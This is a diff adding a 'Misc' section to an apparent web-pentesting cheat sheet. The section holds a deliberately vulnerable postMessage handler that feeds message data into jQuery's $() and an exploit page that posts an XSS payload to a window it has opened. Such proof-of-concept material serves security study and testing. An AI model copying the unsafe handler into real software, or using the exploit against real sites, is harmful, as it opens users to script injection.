@@ -346,3 +346,36 @@ SAML Raider – SAML testing
 Upload Scanner – File upload tester
 Web Cache Deception Scanner
 ```
+
+
+
+### Misc
+```
+Vulnerable PostMessage
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>
+window.addEventListener("message", (event) => {
+console.log(event.data);
+$(event.data)
+}, false);
+</script>
+
+
+Exploit 
+<!DOCTYPE html>
+<html>
+    <head>
+    </head>
+<body>
+<script>
+var myWindow = window.open("http://example.com/test.html")
+</script>
+<script>
+setInterval(function(){myWindow.postMessage("<img src=x onerror=alert(123);>","*");},3000);
+window.onmessage = function (e) {
+console.log(e);
+};
+</script>
+</body>
+</html>
+```
